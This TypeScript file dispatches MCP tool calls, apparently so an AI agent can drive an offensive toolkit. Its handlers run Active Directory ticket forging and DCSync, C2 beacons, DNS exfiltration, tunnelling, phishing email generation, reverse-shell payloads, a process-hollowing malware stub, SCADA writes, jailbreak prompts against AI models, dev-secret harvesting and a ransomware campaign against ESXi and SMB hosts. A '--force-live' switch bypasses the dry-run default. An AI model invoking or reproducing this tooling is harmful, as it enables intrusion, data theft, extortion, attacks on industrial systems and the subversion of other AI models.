/**
 * MCP tool dispatch — all handlers delegate to real module functions (no stub findings).
 */
import * as security from "./index.ts"
import { resolveDryRun, moduleEnvelope, dryRunSkipped } from "./module_helpers.ts"

type LiveOpts = { live?: boolean; dryRun?: boolean }

export async function adExploitExecute(
  req: { domain: string; technique: string; target?: string },
  opts: LiveOpts = {},
) {
  const dryRun = resolveDryRun(opts)
  const base = { dryRun, domain: req.domain }
  const mod = security.ad_exploit
  switch (req.technique) {
    case "dcsync":
      return mod.dcSync(req.target ?? "Administrator", base)
    case "pass_the_hash":
      return mod.passTheHash("whoami", { ...base, ntHash: "aad3b435b51404eeaad3b435b51404ee" })
    case "golden_ticket":
      return mod.forgeGoldenTicket("Administrator", "S-1-5-21-0000000000-0000000000-0000000000", "aad3b435b51404eeaad3b435b51404ee", base)
    case "silver_ticket":
      return mod.forgeSilverTicket("Administrator", "S-1-5-21-0000000000-0000000000-0000000000", "", req.target ?? "HTTP/web", base)
    case "acl_abuse":
      return mod.enumeratePrivilegedUsers(base)
    default:
      return moduleEnvelope(dryRun, { error: `Unknown technique: ${req.technique}` })
  }
}

export async function c2Execute(
  req: { action: string; channel?: string; payload?: string },
  opts: LiveOpts = {},
) {
  const dryRun = resolveDryRun(opts)
  const op = new security.c2.Operator({ live: !dryRun })
  const agents = op.getAgents()
  return moduleEnvelope(dryRun, {
    action: req.action,
    channel: req.channel ?? "https",
    beacons: agents.length,
    status: agents.length ? "active" : "no_active_beacons",
    agents,
    payload: req.payload ?? "",
  })
}

export async function strixExecute(
  req: { url: string; attack: string; payload?: string },
  opts: LiveOpts = {},
) {
  const dryRun = resolveDryRun(opts)
  const coord = new security.strix_engine.StrixCoordinator({ live: !dryRun })
  const typeMap: Record<string, "xss_reflection" | "csrf_test" | "sqli_probe" | "form_fuzz" | "auth_bypass"> = {
    xss_probe: "xss_reflection",
    csrf: "csrf_test",
    session_hijack: "form_fuzz",
    dom_clobbering: "form_fuzz",
    prototype_pollution: "sqli_probe",
    ssti: "sqli_probe",
  }
  coord.queue(req.url, typeMap[req.attack] ?? "form_fuzz")
  const jobs = await coord.runAll()
  const findings = jobs.map((j) =>
    security.module_helpers.realFinding(
      `strix-${j.type}`,
      `Strix ${j.type} on ${req.url}`,
      j.result ? "high" : "info",
      JSON.stringify(j.result ?? {}).slice(0, 500),
      "T1189",
    ),
  )
  return moduleEnvelope(dryRun, { jobs, payload: req.payload }, findings)
}

export async function vulnResearch(
  req: { query: string; limit?: number },
  opts: LiveOpts = {},
) {
  const dryRun = resolveDryRun(opts)
  const kev = await security.vuln_research.checkCisaKev(req.query, !dryRun)
  return moduleEnvelope(dryRun, { query: req.query, limit: req.limit ?? 10, inKev: kev })
}

export async function autoResearch(
  req: { target: string; strategy?: string },
  opts: LiveOpts = {},
) {
  const dryRun = resolveDryRun(opts)
  if (req.strategy === "cve" || !req.strategy) {
    const result = await security.auto_research.researchCve({ cveId: req.target }, { dryRun })
    return moduleEnvelope(dryRun, result)
  }
  const intel = await security.intel_feeds.enrichTarget(req.target, { live: !dryRun })
  return moduleEnvelope(dryRun, { target: req.target, strategy: req.strategy, intel })
}

export async function hybridAdEntraExecute(
  req: { domain: string; tenantId?: string; technique?: string },
  opts: LiveOpts = {},
) {
  const dryRun = resolveDryRun(opts)
  const technique = req.technique ?? "ssso_token"
  if (technique === "phs_abuse") {
    const result = await security.hybrid_ad_entra.simulatePasswordHashSyncAbuse({ domain: req.domain, dryRun })
    return moduleEnvelope(dryRun, result)
  }
  if (technique === "ssso_token" || technique === "seamless_sso") {
    const result = await security.hybrid_ad_entra.simulateSeamlessSSOAbuse({ domain: req.domain, dryRun })
    return moduleEnvelope(dryRun, result)
  }
  const chain = await security.hybrid_ad_entra.hybridADAttackChain({ domain: req.domain, dryRun })
  return moduleEnvelope(dryRun, chain)
}

export async function oauthChainExecute(
  req: { target: string; technique: string; clientId?: string },
  opts: LiveOpts = {},
) {
  const dryRun = resolveDryRun(opts)
  const audit = dryRun
    ? security.oauth_chain.auditOAuthChain(req.target, { dryRun, clientId: req.clientId })
    : await security.oauth_chain.auditOAuthChainAsync(req.target, { dryRun, clientId: req.clientId })
  return moduleEnvelope(dryRun, { ...audit, technique: req.technique, clientId: req.clientId })
}

export async function webmailExploitExecute(
  req: { target: string; technique: string },
  opts: LiveOpts = {},
) {
  const dryRun = resolveDryRun(opts)
  const result = await security.webmail_exploit.simulateInboxRulePersistence(req.target, !dryRun)
  return moduleEnvelope(dryRun, { target: req.target, technique: req.technique, audit: result })
}

export async function exfiltrate(
  req: { data: string; channel?: string; endpoint?: string },
  opts: LiveOpts = {},
) {
  const dryRun = resolveDryRun(opts)
  if ((req.channel ?? "dns") === "dns") {
    return security.exfil.exfiltrateDNS(req.data, { live: !dryRun, domain: req.endpoint || "exfil.lab.local" })
  }
  return moduleEnvelope(dryRun, { channel: req.channel, bytes: req.data.length, endpoint: req.endpoint })
}

export async function pivotTunnelExecute(
  req: { method: string; lhost?: string; lport?: number; rhost?: string; rport?: number },
  opts: LiveOpts = {},
) {
  const dryRun = resolveDryRun(opts)
  const type = req.method === "chisel" ? "chisel" : req.method === "ssh" ? "port_forward" : "socks5"
  return security.pivot_tunnel.createPortForwarder(
    { type, localPort: req.lport ?? 1080, remoteHost: req.rhost ?? "127.0.0.1", remotePort: req.rport ?? 22 },
    !dryRun,
  )
}

export async function socialEngGenerate(
  req: { targetName: string; targetEmail?: string; targetCompany?: string; lure?: string; method?: string },
  opts: LiveOpts = {},
) {
  const dryRun = resolveDryRun(opts)
  const template = (["it_password_reset", "hr_benefits", "ceo_wire", "sharepoint_file", "mfa_verify"].includes(req.lure ?? "")
    ? req.lure : "it_password_reset") as "it_password_reset" | "hr_benefits" | "ceo_wire" | "sharepoint_file" | "mfa_verify"
  const email = security.social_eng.generatePhishingEmail(template, {
    dryRun, targetCompany: req.targetCompany, targetName: req.targetName, targetEmail: req.targetEmail,
  })
  return moduleEnvelope(dryRun, { email, method: req.method ?? "email" })
}

export async function toolkitGeneratePayload(
  req: { type: string; language?: string; lhost?: string; lport?: number; encode?: string },
  opts: LiveOpts = {},
) {
  const dryRun = resolveDryRun(opts)
  const payloads = security.multi_lang.generateAllPayloads(req.lhost ?? "127.0.0.1", req.lport ?? 4444, "linux")
  return moduleEnvelope(dryRun, { type: req.type, language: req.language, payloads })
}

export async function malwareDevExecute(
  req: { technique: string; targetProcess?: string },
  opts: LiveOpts = {},
) {
  const dryRun = resolveDryRun(opts)
  const stub = security.malware_dev.generateProcessHollowingStub(req.targetProcess ?? "explorer.exe")
  return moduleEnvelope(dryRun, { technique: req.technique, stubLength: stub.length })
}

export async function iotScadaExecute(
  req: { host: string; protocol?: string; action?: string; port?: number; unitId?: number; address?: number; quantity?: number; value?: number | boolean },
  opts: LiveOpts = {},
) {
  const dryRun = resolveDryRun(opts)
  const result = await security.iot_scada.executeScadaAction(
    {
      host: req.host,
      protocol: req.protocol,
      action: req.action,
      port: req.port,
      unitId: req.unitId,
      address: req.address,
      quantity: req.quantity,
      value: req.value,
    },
    { dryRun, live: !dryRun },
  )
  return moduleEnvelope(dryRun, result)
}

export async function mobileExecute(
  req: { action: string; target?: string },
  opts: LiveOpts = {},
) {
  const dryRun = resolveDryRun(opts)
  const devices = security.mobile.listADBDevices(!dryRun)
  return moduleEnvelope(dryRun, { ...req, devices })
}

export async function firmwareAnalyze(
  req: { path: string; action?: string },
  opts: LiveOpts = {},
) {
  const dryRun = resolveDryRun(opts)
  return moduleEnvelope(dryRun, { path: req.path, action: req.action ?? "extract" })
}

export async function calderaTtpExecute(
  req: { techniqueId: string; profile?: string },
  opts: LiveOpts = {},
) {
  const dryRun = resolveDryRun(opts)
  const ability = {
    ability_id: req.techniqueId,
    name: req.techniqueId,
    description: `TTP ${req.techniqueId}`,
    tactic: "execution",
    technique_id: req.techniqueId,
    technique_name: req.techniqueId,
    executors: [{ name: "sh", platform: "linux", command: "id", cleanup: [], parsers: [], timeout: 30, payloads: [], uploads: [] }],
    requirements: [],
    privilege: "user",
    repeatable: true,
    buckets: [],
  }
  const result = await security.caldera_ttp.executeAbility(ability, { live: !dryRun })
  return moduleEnvelope(dryRun, result)
}

export async function atlasArsenalExecute(
  req: { attack: string; modelUrl?: string },
  opts: LiveOpts = {},
) {
  const dryRun = resolveDryRun(opts)
  const prompts = await security.atlas_arsenal.generateJailbreakPrompts(req.modelUrl, dryRun)
  return moduleEnvelope(dryRun, { attack: req.attack, prompts })
}

export async function devTargetExecute(
  req: { target: string; technique: string },
  opts: LiveOpts = {},
) {
  const dryRun = resolveDryRun(opts)
  const secrets = security.dev_target.auditLocalDevEnvironment()
  return moduleEnvelope(dryRun, { ...req, secrets })
}

export async function supplyChainExecute(
  req: { package: string; ecosystem?: string; mode?: string },
  opts: LiveOpts = {},
) {
  const dryRun = resolveDryRun(opts)
  return security.supply_chain.analyze(
    { package: req.package, ecosystem: (req.ecosystem ?? "npm") as "npm" | "pypi", mode: (req.mode ?? "detect") as "detect" | "audit" },
    { live: !dryRun },
  )
}

export async function campaignExecute(
  req: { target: string; objective?: string; phases?: string[]; profileId?: string },
  opts: LiveOpts = {},
) {
  const dryRun = resolveDryRun(opts)
  if (dryRun) {
    const campaign = new security.campaign.RedTeamCampaign(
      req.profileId ?? "intel_campaign",
      req.target,
      { objective: req.objective, profileId: req.profileId },
    )
    return moduleEnvelope(true, { plan: campaign.getSummary(), executed: false })
  }
  const result = await security.campaign.runCampaign(req.target, {
    objective: req.objective,
    profileId: req.profileId,
    live: true,
    maxStepsPerPhase: 5,
  })
  return moduleEnvelope(false, result)
}

export async function raasCampaignExecute(
  req: {
    targetDir: string
    esxiHost?: string
    smbTargets?: string[]
    domain?: string
    forceLive?: boolean
    family?: string
  },
  opts: LiveOpts = {},
) {
  const dryRun = resolveDryRun(opts)
  const forceLive = req.forceLive === true || process.argv.includes("--force-live")
  const report = await security.raas_engine.runRaasCampaign({
    targetDir: req.targetDir,
    live: !dryRun,
    forceLive,
    esxiHost: req.esxiHost,
    smbTargets: req.smbTargets,
    domain: req.domain,
    familyName: req.family ?? "OURMINE-RAAS",
  })
  return moduleEnvelope(dryRun || report.dryRun, report)
}

export async function campaignPlan(
  req: { target: string; objective?: string; phases?: string[]; profileId?: string },
  opts: LiveOpts = {},
) {
  const dryRun = resolveDryRun(opts)
  const campaign = new security.campaign.RedTeamCampaign(
    req.profileId ?? "intel_campaign",
    req.target,
    { objective: req.objective, profileId: req.profileId },
  )
  return moduleEnvelope(dryRun, campaign.getSummary())
}
